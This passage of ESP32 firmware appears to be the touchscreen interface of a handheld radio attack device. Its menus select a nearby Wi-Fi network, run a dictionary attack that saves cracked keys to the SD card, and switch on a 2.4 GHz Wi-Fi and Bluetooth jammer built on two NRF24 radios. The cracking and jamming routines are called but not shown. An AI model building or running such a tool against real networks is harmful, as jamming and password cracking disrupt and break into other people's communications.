  if (!uiEnableLyrics) return;
  if (millis() - lastLyricsUpdateTime < 3000) return;
  lastLyricsUpdateTime = millis();

  if (sdCardAvailable && SD.exists("/lyrics.txt")) {
    File f = SD.open("/lyrics.txt", FILE_READ);
    if (f) {
      int lineCount = 0;
      String targetLine = "";
      while (f.available()) {
        String l = f.readStringUntil('\n');
        l.trim();
        if (l.length() == 0 || l.startsWith("#")) continue;
        if (lineCount == lyricsLineIndex) {
          // Remove timestamp if present: [00:00.00]
          if (l.startsWith("[")) {
            int closeBracket = l.indexOf(']');
            if (closeBracket != -1) l = l.substring(closeBracket + 1);
          }
          l.trim();
          targetLine = l;
          break;
        }
        lineCount++;
      }
      f.close();

      if (targetLine.length() > 0) {
        currentLyricsLine = targetLine;
        lyricsLineIndex++;
      } else {
        lyricsLineIndex = 0; // Loop back
      }
    }
  }

  // Update marquee text on Main Menu
  if (currentScreen == SCREEN_MAIN_MENU) {
    tft.fillRect(10, 222, 300, 14, COLOR_BG);
    tft.setTextColor(COLOR_ACCENT);
    tft.setTextSize(1);
    tft.setCursor(14, 225);
    tft.print(currentLyricsLine.substring(0, 38));
  }
}

// ----------------------------------------------------
// Display Functions (2.4" TFT LCD Shield - 8-Bit Parallel)
// ----------------------------------------------------
void runStartupAnimation() {
  tft.fillScreen(COLOR_BG);

  // 1. If SD Card has /splash.bmp, display it with loading progress bar!
  if (sdCardAvailable && uiUseSdSplash && SD.exists("/splash.bmp")) {
    Serial.println("Displaying custom SD splash.bmp...");
    if (drawBMP("/splash.bmp", 0, 0)) {
      // Draw progress bar across bottom of splash
      tft.drawRoundRect(40, 205, 240, 14, 4, COLOR_ACCENT);
      for (int p = 0; p <= 100; p += 5) {
        int fillW = map(p, 0, 100, 0, 236);
        tft.fillRoundRect(42, 207, fillW, 10, 2, COLOR_GREEN);
        delay(25);
      }
      delay(400);
    }
  }

  // 2. 3D Rotating Wireframe Cube Boot Animation
  tft.fillScreen(COLOR_BG);

  float vertices[8][3] = {
    {-24, -24, -24}, { 24, -24, -24}, { 24,  24, -24}, {-24,  24, -24},
    {-24, -24,  24}, { 24, -24,  24}, { 24,  24,  24}, {-24,  24,  24}
  };

  int edges[12][2] = {
    {0, 1}, {1, 2}, {2, 3}, {3, 0},
    {4, 5}, {5, 6}, {6, 7}, {7, 4},
    {0, 4}, {1, 5}, {2, 6}, {3, 7}
  };

  int prevX[8], prevY[8];
  int currX[8], currY[8];

  float angleX = 0, angleY = 0, angleZ = 0;
  int centerX = 160;
  int centerY = 72;

  // Title Text
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(60, 140);
  tft.print(uiAppTitle);

  tft.setTextColor(COLOR_TEXT_MUTED);
  tft.setTextSize(1);
  tft.setCursor(55, 162);
  tft.print("SD CORE & 3D ENGINE INITIALIZING...");

  // Progress Bar Outline
  int barX = 40;
  int barY = 185;
  int barWidth = 240;
  int barHeight = 16;
  tft.drawRoundRect(barX, barY, barWidth, barHeight, 4, COLOR_ACCENT);

  // 3D Matrix Rotation Loop (40 Frames)
  for (int frame = 0; frame < 40; frame++) {
    for (int i = 0; i < 8; i++) {
      float x = vertices[i][0];
      float y = vertices[i][1];
      float z = vertices[i][2];

      float y1 = y * cos(angleX) - z * sin(angleX);
      float z1 = y * sin(angleX) + z * cos(angleX);

      float x2 = x * cos(angleY) + z1 * sin(angleY);
      float z2 = -x * sin(angleY) + z1 * cos(angleY);

      float x3 = x2 * cos(angleZ) - y1 * sin(angleZ);
      float y3 = x2 * sin(angleZ) + y1 * cos(angleZ);

      float fov = 180.0 / (180.0 + z2);
      currX[i] = centerX + (int)(x3 * fov);
      currY[i] = centerY + (int)(y3 * fov);
    }

    if (frame > 0) {
      for (int e = 0; e < 12; e++) {
        tft.drawLine(prevX[edges[e][0]], prevY[edges[e][0]], prevX[edges[e][1]], prevY[edges[e][1]], COLOR_BG);
      }
    }

    for (int e = 0; e < 12; e++) {
      uint16_t color = (e < 4) ? COLOR_ACCENT : (e < 8 ? COLOR_YELLOW : COLOR_GREEN);
      tft.drawLine(currX[edges[e][0]], currY[edges[e][0]], currX[edges[e][1]], currY[edges[e][1]], color);
    }

    for (int i = 0; i < 8; i++) {
      prevX[i] = currX[i];
      prevY[i] = currY[i];
    }

    int fillW = map(frame, 0, 39, 0, barWidth - 4);
    tft.fillRoundRect(barX + 2, barY + 2, fillW, barHeight - 4, 2, COLOR_GREEN);

    int percent = map(frame, 0, 39, 0, 100);
    tft.fillRect(140, 210, 50, 15, COLOR_BG);
    tft.setCursor(145, 210);
    tft.setTextColor(COLOR_YELLOW);
    tft.setTextSize(1);
    tft.print(String(percent) + "%");

    angleX += 0.12;
    angleY += 0.15;
    angleZ += 0.08;

    delay(30);
  }

  delay(200);
}

void initDisplay() {
  uint16_t ID = tft.readID();
  Serial.print("TFT LCD Controller ID: 0x");
  Serial.println(ID, HEX);
  if (ID == 0xD3D3 || ID == 0x0) ID = 0x9341;
  tft.begin(ID);
  tft.setRotation(1); // Landscape mode (320x240)
  tft.fillScreen(COLOR_BG);
  Serial.println("MCUFRIEND 2.4\" TFT LCD Shield initialized.");

  // Initialize MicroSD Card & Load UI Assets
  initSDCard();

  runStartupAnimation();
}

// ====================================================
// SCREEN SWITCHER
// ====================================================
void setScreen(ScreenState s) {
  currentScreen = s;
  actionActive = false;
  digitalWrite(LED_PIN, LOW);
  stopWiFiSniffer();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);

  switch (s) {
    case SCREEN_MAIN_MENU:     drawMainMenu();      break;
    case SCREEN_WIFI_SUBMENU:  drawWifiSubMenu();   break;
    case SCREEN_WIFI_SELECT:   drawWifiSelectScreen(); break;
    case SCREEN_WIFI_CRACK:    drawWifiCrackScreen(); break;
    case SCREEN_JAMMER:        drawJammerScreen();  break;
    case SCREEN_RESET:         drawResetScreen();   break;
    default:                   drawMainMenu();      break;
  }
}

// -----------------------------------------------------------
// Helper: draw top header bar with optional back arrow & SD badge
// -----------------------------------------------------------
void drawHeader(const char* title, bool showBack) {
  tft.fillRect(0, 0, 320, 35, COLOR_HEADER);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  if (showBack) {
    tft.setCursor(6, 8);
    tft.print("<");
    tft.setCursor(26, 8);
  } else {
    tft.setCursor(8, 8);
  }
  tft.print(title);

  // MicroSD Status Badge on top right
  if (uiShowSdBadge) {
    if (sdCardAvailable) {
      tft.fillRoundRect(262, 7, 52, 20, 4, COLOR_GREEN);
      tft.setTextColor(COLOR_BG);
      tft.setTextSize(1);
      tft.setCursor(269, 13);
      tft.print("SD:OK");
    } else {
      tft.fillRoundRect(262, 7, 52, 20, 4, 0x39E7);
      tft.setTextColor(COLOR_TEXT_MUTED);
      tft.setTextSize(1);
      tft.setCursor(265, 13);
      tft.print("SD:NONE");
    }
  }
}

// -----------------------------------------------------------
// 1. MAIN MENU (3 big option buttons + SD status footer)
// -----------------------------------------------------------
void drawMainMenu() {
  if (uiUseSdBg && sdCardAvailable && SD.exists("/menu_bg.bmp")) {
    drawBMP("/menu_bg.bmp", 0, 0);
  } else {
    tft.fillScreen(COLOR_BG);
  }

  drawHeader(uiAppTitle.c_str(), false);

  // -- Option 1: WIFI SCANNER (green) --
  tft.fillRoundRect(10, 44, 300, 52, 8, COLOR_GREEN);
  tft.drawRoundRect(10, 44, 300, 52, 8, COLOR_TEXT);
  tft.setTextColor(COLOR_BG);
  tft.setTextSize(2);
  tft.setCursor(22, 51);
  tft.print("1. WIFI SCANNER");
  tft.setTextSize(1);
  tft.setTextColor(0x0000);
  tft.setCursor(22, 73);
  tft.print("Select network / Find password");

  // -- Option 2: WIFI+BT JAMMER (red) --
  tft.fillRoundRect(10, 103, 300, 52, 8, COLOR_RED);
  tft.drawRoundRect(10, 103, 300, 52, 8, COLOR_TEXT);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(22, 110);
  tft.print("2. WIFI+BT JAMMER");
  tft.setTextSize(1);
  tft.setTextColor(COLOR_YELLOW);
  tft.setCursor(22, 132);
  tft.print("2.4GHz BLE, BT Classic & Wi-Fi");

  // -- Option 3: RESET (card/slate) --
  tft.fillRoundRect(10, 162, 300, 52, 8, COLOR_CARD);
  tft.drawRoundRect(10, 162, 300, 52, 8, COLOR_TEXT);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(22, 169);
  tft.print("3. RESET");
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT_MUTED);
  tft.setCursor(22, 191);
  tft.print("Restart device to initial state");

  // Bottom Status / Lyrics Banner
  tft.setTextColor(COLOR_ACCENT);
  tft.setTextSize(1);
  tft.setCursor(14, 225);
  tft.print(currentLyricsLine.substring(0, 38));
}

// -----------------------------------------------------------
// 2. WIFI SCANNER SUB-MENU
// -----------------------------------------------------------
void drawWifiSubMenu() {
  tft.fillScreen(COLOR_BG);
  drawHeader("WIFI SCANNER", true);

  // Sub-option 1.1: SELECT WIFI
  tft.fillRoundRect(10, 50, 300, 70, 8, 0x03EF);   // teal
  tft.drawRoundRect(10, 50, 300, 70, 8, COLOR_TEXT);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(22, 60);
  tft.print("1.1 SELECT WIFI");
  tft.setTextSize(1);
  tft.setTextColor(0xD7FF);
  tft.setCursor(22, 84);
  tft.print("Scan & choose a nearby network");

  // Sub-option 1.2: FIND PASSWORD
  tft.fillRoundRect(10, 132, 300, 70, 8, 0x8010);  // violet
  tft.drawRoundRect(10, 132, 300, 70, 8, COLOR_TEXT);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(22, 142);
  tft.print("1.2 FIND PASSWORD");
  tft.setTextSize(1);
  tft.setTextColor(0xFFB2);
  tft.setCursor(22, 166);
  tft.print("Dictionary audit on selected AP");

  // Back hint
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT_MUTED);
  tft.setCursor(10, 218);
  tft.print("BOOT/tap header to go back");
}

// -----------------------------------------------------------
// 3. SELECT WIFI SCREEN
// -----------------------------------------------------------
void drawWifiSelectScreen() {
  tft.fillScreen(COLOR_BG);
  drawHeader("SELECT WIFI", true);

  // Trigger scan immediately
  setMode(MODE_WIFI_SCAN);
  scanWiFiNetworks();

  tft.fillRect(0, 35, 320, 2, COLOR_ACCENT);

  if (wifiNetworkCount == 0) {
    tft.setTextColor(COLOR_YELLOW);
    tft.setTextSize(1);
    tft.setCursor(30, 110);
    tft.print("No networks found. Tap SCAN.");
  } else {
    // List up to 8 networks
    int shown = min(wifiNetworkCount, 8);
    for (int i = 0; i < shown; i++) {
      uint16_t rowColor = (i == selectedTargetIndex) ? COLOR_ACCENT : COLOR_CARD;
      tft.fillRoundRect(8, 40 + i * 24, 304, 22, 3, rowColor);
      tft.setTextColor((i == selectedTargetIndex) ? COLOR_BG : COLOR_TEXT);
      tft.setTextSize(1);
      tft.setCursor(14, 46 + i * 24);
      String label = String(i + 1) + ". " + scannedNetworks[i].ssid.substring(0, 20);
      label += "  " + String(scannedNetworks[i].rssi) + "dBm";
      tft.print(label);
    }
  }

  // SCAN button at bottom
  tft.fillRoundRect(10, 208, 140, 26, 5, COLOR_GREEN);
  tft.setTextColor(COLOR_BG);
  tft.setTextSize(1);
  tft.setCursor(28, 215);
  tft.print(">> SCAN");

  // CONFIRM button at bottom right
  tft.fillRoundRect(166, 208, 144, 26, 5, COLOR_ACCENT);
  tft.setTextColor(COLOR_BG);
  tft.setCursor(184, 215);
  tft.print("CONFIRM CHOICE");
}

// -----------------------------------------------------------
// 4. FIND PASSWORD / CRACK SCREEN
// -----------------------------------------------------------
void drawWifiCrackScreen() {
  tft.fillScreen(COLOR_BG);
  drawHeader("FIND PASSWORD", true);

  tft.fillRect(0, 35, 320, 2, COLOR_ACCENT);

  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT_MUTED);
  tft.setCursor(14, 44);
  tft.print("Target AP:");
  tft.setTextColor(COLOR_ACCENT);
  tft.setTextSize(1);
  tft.setCursor(75, 44);
  if (wifiNetworkCount > 0) {
    tft.print(scannedNetworks[selectedTargetIndex].ssid.substring(0, 22));
  } else {
    tft.print("(none selected)");
  }

  tft.drawRoundRect(8, 58, 304, 60, 6, COLOR_CARD);
  tft.fillRoundRect(9, 59, 302, 58, 6, COLOR_CARD);
  tft.setTextColor(COLOR_TEXT_MUTED);
  tft.setTextSize(1);
  tft.setCursor(16, 66);
  tft.print("Status:");
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(16, 80);
  tft.print(crackStatusMsg.substring(0, 35));

  tft.setTextColor(COLOR_TEXT_MUTED);
  tft.setCursor(16, 96);
  tft.print("Dictionary: SD /wordlist.txt  |  Internal: 10 keys");

  // Instructions
  tft.setTextColor(COLOR_YELLOW);
  tft.setTextSize(1);
  tft.setCursor(14, 128);
  tft.print("Tap START to run audit engine.");
  tft.setTextColor(COLOR_TEXT_MUTED);
  tft.setCursor(14, 143);
  tft.print("Uses wordlist to test passphrases.");
  tft.setCursor(14, 155);
  tft.print("Results saved to SD /cracked_keys.txt");

  // START button
  tft.fillRoundRect(10, 174, 300, 36, 7, 0x8010);
  tft.drawRoundRect(10, 174, 300, 36, 7, COLOR_TEXT);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(80, 183);
  tft.print(">> START AUDIT");

  // Back hint
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT_MUTED);
  tft.setCursor(10, 220);
  tft.print("BOOT button / tap header to go back");
}

// -----------------------------------------------------------
// 5. WIFI+BT JAMMER SCREEN
// -----------------------------------------------------------
void drawJammerScreen() {
  tft.fillScreen(COLOR_BG);
  drawHeader("WIFI+BT JAMMER", true);

  tft.fillRect(0, 35, 320, 2, COLOR_RED);

  // Warning box
  tft.fillRoundRect(8, 42, 304, 28, 5, 0x5000);
  tft.setTextColor(COLOR_YELLOW);
  tft.setTextSize(1);
  tft.setCursor(16, 50);
  tft.print("! FOR AUTHORIZED/LAB USE ONLY !");

  // Status box
  tft.drawRoundRect(8, 78, 304, 56, 6, COLOR_CARD);
  tft.fillRoundRect(9, 79, 302, 54, 6, COLOR_CARD);
  tft.setTextColor(COLOR_TEXT_MUTED);
  tft.setTextSize(1);
  tft.setCursor(16, 87);
  tft.print("MODE:");
  tft.setTextColor(actionActive ? COLOR_RED : COLOR_GREEN);
  tft.setCursor(55, 87);
  tft.print(actionActive ? "ACTIVE - JAMMING..." : "IDLE");

  tft.setTextColor(COLOR_TEXT_MUTED);
  tft.setCursor(16, 103);
  tft.print("Total RF hops transmitted:");
  tft.setTextColor(COLOR_ACCENT);
  tft.setCursor(16, 116);
  tft.print(String(hopCount));

  // JAMMER ON button
  tft.fillRoundRect(10, 143, 140, 38, 7, COLOR_GREEN);
  tft.drawRoundRect(10, 143, 140, 38, 7, COLOR_TEXT);
  tft.setTextColor(COLOR_BG);
  tft.setTextSize(2);
  tft.setCursor(22, 153);
  tft.print("JAMMER ON");

  // JAMMER OFF button
  tft.fillRoundRect(166, 143, 144, 38, 7, COLOR_RED);
  tft.drawRoundRect(166, 143, 144, 38, 7, COLOR_TEXT);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(176, 153);
  tft.print("JAMMER OFF");

  // Coverage label
  tft.setTextColor(COLOR_TEXT_MUTED);
  tft.setTextSize(1);
  tft.setCursor(10, 192);
  tft.print("NRF24 Radio 1: 2402-2440 MHz  (BLE ch 0-38)");
  tft.setCursor(10, 204);
  tft.print("NRF24 Radio 2: 2441-2480 MHz  (BLE ch 39-79)");

  // Back hint
  tft.setTextColor(COLOR_TEXT_MUTED);
  tft.setCursor(10, 220);
  tft.print("BOOT / tap header to go back to menu");
}

// -----------------------------------------------------------
// 6. RESET SCREEN
// -----------------------------------------------------------
void drawResetScreen() {
  tft.fillScreen(COLOR_BG);
  drawHeader("RESET DEVICE", true);

  tft.fillRect(0, 35, 320, 2, COLOR_RED);

  tft.setTextColor(COLOR_YELLOW);
  tft.setTextSize(2);
  tft.setCursor(40, 65);
  tft.print("CONFIRM RESET?");

  tft.setTextColor(COLOR_TEXT_MUTED);
  tft.setTextSize(1);
  tft.setCursor(20, 95);
  tft.print("This will restart the ESP32 device.");
  tft.setCursor(20, 110);
  tft.print("All running scans will be stopped.");

  // YES button
  tft.fillRoundRect(20, 140, 120, 44, 8, COLOR_RED);
  tft.drawRoundRect(20, 140, 120, 44, 8, COLOR_TEXT);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(44, 153);
  tft.print("YES");

  // NO button
  tft.fillRoundRect(180, 140, 120, 44, 8, COLOR_GREEN);
  tft.drawRoundRect(180, 140, 120, 44, 8, COLOR_TEXT);
  tft.setTextColor(COLOR_BG);
  tft.setTextSize(2);
  tft.setCursor(212, 153);
  tft.print("NO");

  tft.setTextColor(COLOR_TEXT_MUTED);
  tft.setTextSize(1);
  tft.setCursor(10, 220);
  tft.print("NO or BOOT to cancel");
}

void drawStaticUI() {
  tft.fillScreen(COLOR_BG);

  // Top Header Bar
  tft.fillRect(0, 0, 320, 35, COLOR_HEADER);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(10, 8);
  tft.print("CRADLEGUARD RF & WPA");

  // Status Info Box
  tft.drawRoundRect(10, 42, 300, 105, 8, COLOR_ACCENT);
  tft.fillRoundRect(11, 43, 298, 103, 8, COLOR_CARD);

  // Main Action Buttons
  tft.fillRoundRect(15, 158, 135, 36, 6, COLOR_GREEN);
  tft.drawRoundRect(15, 158, 135, 36, 6, COLOR_TEXT);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(32, 168);
  tft.print("TURN ON");

  tft.fillRoundRect(165, 158, 135, 36, 6, COLOR_RED);
  tft.drawRoundRect(165, 158, 135, 36, 6, COLOR_TEXT);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(178, 168);
  tft.print("TURN OFF");
}

void updateDisplayUI(bool forceRedraw) {
  // Only used in legacy JAMMER screen now
  if (currentScreen == SCREEN_JAMMER) {
    static unsigned long lastJamUITime = 0;
    if (forceRedraw || millis() - lastJamUITime > 500) {
      lastJamUITime = millis();
      // Refresh hop counter
      tft.fillRect(16, 116, 180, 12, COLOR_CARD);
      tft.setTextColor(COLOR_ACCENT);
      tft.setTextSize(1);
      tft.setCursor(16, 116);
      tft.print(String(hopCount));
      // Refresh status
      tft.fillRect(55, 87, 200, 12, COLOR_CARD);
      tft.setTextColor(actionActive ? COLOR_RED : COLOR_GREEN);
      tft.setCursor(55, 87);
      tft.print(actionActive ? "ACTIVE - JAMMING..." : "IDLE             ");
    }
  }
}

// ----------------------------------------------------
// Touch & Pushbutton Handlers
// ----------------------------------------------------
void checkTouch() {
  TSPoint p = touch.getPoint();
  // Restore pin modes after reading resistive touchscreen
  pinMode(YP, OUTPUT);
  pinMode(XM, OUTPUT);
  digitalWrite(YP, HIGH);
  digitalWrite(XM, HIGH);

  if (p.z < 10 || p.z > 1000) return;
  if (millis() - lastTouchTime < 350) return;

  lastTouchTime = millis();

  int touchX = map(p.y, 150, 920, 0, 320);
  int touchY = map(p.x, 120, 900, 0, 240);

  // =============================================
  // MAIN MENU  (3 big option rows)
  // =============================================
  if (currentScreen == SCREEN_MAIN_MENU) {
    // Option 1 — WIFI SCANNER  (Y: 45-99)
    if (touchY >= 45 && touchY <= 99) {
      setScreen(SCREEN_WIFI_SUBMENU);
    }
    // Option 2 — WIFI+BT JAMMER  (Y: 108-162)
    else if (touchY >= 108 && touchY <= 162) {
      setMode(MODE_BLE);   // start in BLE jammer mode
      setScreen(SCREEN_JAMMER);
    }
    // Option 3 — RESET  (Y: 171-225)
    else if (touchY >= 171 && touchY <= 225) {
      setScreen(SCREEN_RESET);
    }
    return;
  }

  // =============================================
  // WIFI SCANNER SUB-MENU (two sub-options)
  // =============================================
  if (currentScreen == SCREEN_WIFI_SUBMENU) {
    // Back arrow / header  (Y: 0-35)
    if (touchY <= 35) {
      setScreen(SCREEN_MAIN_MENU);
      return;
    }
    // Sub-option 1.1 — SELECT WIFI  (Y: 50-120)
    if (touchY >= 50 && touchY <= 120) {
      setScreen(SCREEN_WIFI_SELECT);
    }
    // Sub-option 1.2 — FIND PASSWORD  (Y: 132-202)
    else if (touchY >= 132 && touchY <= 202) {
      setMode(MODE_WIFI_CRACK);
      setScreen(SCREEN_WIFI_CRACK);
    }
    return;
  }

  // =============================================
  // SELECT WIFI SCREEN
  // =============================================
  if (currentScreen == SCREEN_WIFI_SELECT) {
    // Back header
    if (touchY <= 35) {
      setScreen(SCREEN_WIFI_SUBMENU);
      return;
    }
    // Network row taps  (rows at Y: 40 + i*24, height 22)
    int shown = min(wifiNetworkCount, 8);
    for (int i = 0; i < shown; i++) {
      if (touchY >= 40 + i * 24 && touchY < 62 + i * 24) {
        selectedTargetIndex = i;
        drawWifiSelectScreen(); // re-draw to highlight selection
        return;
      }
    }
    // SCAN button  (X: 10-150, Y: 208-234)
    if (touchX >= 10 && touchX <= 150 && touchY >= 208 && touchY <= 234) {
      setMode(MODE_WIFI_SCAN);
      scanWiFiNetworks();
      drawWifiSelectScreen();
    }
    // CONFIRM button  (X: 166-310, Y: 208-234)
    if (touchX >= 166 && touchX <= 310 && touchY >= 208 && touchY <= 234) {
      setScreen(SCREEN_WIFI_SUBMENU);
    }
    return;
  }

  // =============================================
  // FIND PASSWORD / CRACK SCREEN
  // =============================================
  if (currentScreen == SCREEN_WIFI_CRACK) {
    // Back header
    if (touchY <= 35) {
      setScreen(SCREEN_WIFI_SUBMENU);
      return;
    }
    // START AUDIT button  (Y: 174-210)
    if (touchY >= 174 && touchY <= 210) {
      setMode(MODE_WIFI_CRACK);
      runDictionaryCrack();
      drawWifiCrackScreen(); // refresh result
    }
    return;
  }

  // =============================================
  // JAMMER SCREEN
  // =============================================
  if (currentScreen == SCREEN_JAMMER) {
    // Back header
    if (touchY <= 35) {
      actionActive = false;
      digitalWrite(LED_PIN, LOW);
      setScreen(SCREEN_MAIN_MENU);
      return;
    }
    // JAMMER ON  (X: 10-150, Y: 143-181)
    if (touchX >= 10 && touchX <= 150 && touchY >= 143 && touchY <= 181) {
      actionActive = true;
      digitalWrite(LED_PIN, HIGH);
      updateDisplayUI(true);
    }
    // JAMMER OFF  (X: 166-310, Y: 143-181)
    if (touchX >= 166 && touchX <= 310 && touchY >= 143 && touchY <= 181) {
      actionActive = false;
      digitalWrite(LED_PIN, LOW);
      updateDisplayUI(true);
    }
    return;
  }

  // =============================================
  // RESET SCREEN
  // =============================================
  if (currentScreen == SCREEN_RESET) {
    // Back header
    if (touchY <= 35) {
      setScreen(SCREEN_MAIN_MENU);
      return;
    }
    // YES — reset  (X: 20-140, Y: 140-184)
    if (touchX >= 20 && touchX <= 140 && touchY >= 140 && touchY <= 184) {
      tft.fillScreen(COLOR_BG);
      tft.setTextColor(COLOR_RED);
      tft.setTextSize(2);
      tft.setCursor(60, 100);
      tft.print("RESTARTING...");
      delay(1500);
      ESP.restart();
    }
    // NO — cancel  (X: 180-300, Y: 140-184)
    if (touchX >= 180 && touchX <= 300 && touchY >= 140 && touchY <= 184) {
      setScreen(SCREEN_MAIN_MENU);
    }
    return;
  }
}

void checkPhysicalButtons() {
  bool onState   = digitalRead(BUTTON_ON_PIN);
  bool offState  = digitalRead(BUTTON_OFF_PIN);
  bool bootState = digitalRead(BUTTON_BOOT_PIN);

  // TURN ON button
  if (onState == LOW && lastOnState == HIGH) {
    if (currentScreen == SCREEN_JAMMER) {
      actionActive = true;
      digitalWrite(LED_PIN, HIGH);
      updateDisplayUI(true);
    } else if (currentScreen == SCREEN_WIFI_CRACK) {
      runDictionaryCrack();
      drawWifiCrackScreen();
    } else if (currentScreen == SCREEN_WIFI_SELECT) {
      setMode(MODE_WIFI_SCAN);
      scanWiFiNetworks();
      drawWifiSelectScreen();
    }
    delay(150);
  }

  // TURN OFF button
  if (offState == LOW && lastOffState == HIGH) {
    actionActive = false;
    digitalWrite(LED_PIN, LOW);
    if (currentScreen == SCREEN_JAMMER) updateDisplayUI(true);
    delay(150);
  }

  // BOOT button — navigate BACK / return to main menu
  if (bootState == LOW && lastBootState == HIGH) {
    switch (currentScreen) {
      case SCREEN_MAIN_MENU:    break;  // already at top
      case SCREEN_WIFI_SUBMENU: setScreen(SCREEN_MAIN_MENU);    break;
      case SCREEN_WIFI_SELECT:  setScreen(SCREEN_WIFI_SUBMENU); break;
      case SCREEN_WIFI_CRACK:   setScreen(SCREEN_WIFI_SUBMENU); break;
      case SCREEN_JAMMER:
        actionActive = false;
        digitalWrite(LED_PIN, LOW);
        setScreen(SCREEN_MAIN_MENU);
        break;
      case SCREEN_RESET:        setScreen(SCREEN_MAIN_MENU);    break;
      default:                  setScreen(SCREEN_MAIN_MENU);    break;
    }
    delay(200);
  }

  lastOnState   = onState;
  lastOffState  = offState;
  lastBootState = bootState;
}

// Helper Utilities
String getModeName(SystemMode mode) {
  switch (mode) {
    case MODE_BLE: return "BLE JAMMER";
    case MODE_BT_CLASSIC: return "BT CLASSIC";
    case MODE_WIFI_SCAN: return "WIFI SCANNER";
    case MODE_WIFI_HANDSHAKE: return "WIFI HANDSHAKE";
    case MODE_WIFI_CRACK: return "WIFI CRACKER";
    case MODE_WEB_PORTAL: return "WEB PORTAL";
    default: return "UNKNOWN";
  }
}

String getAuthTypeName(wifi_auth_mode_t auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    default: return "WPA2";
  }
}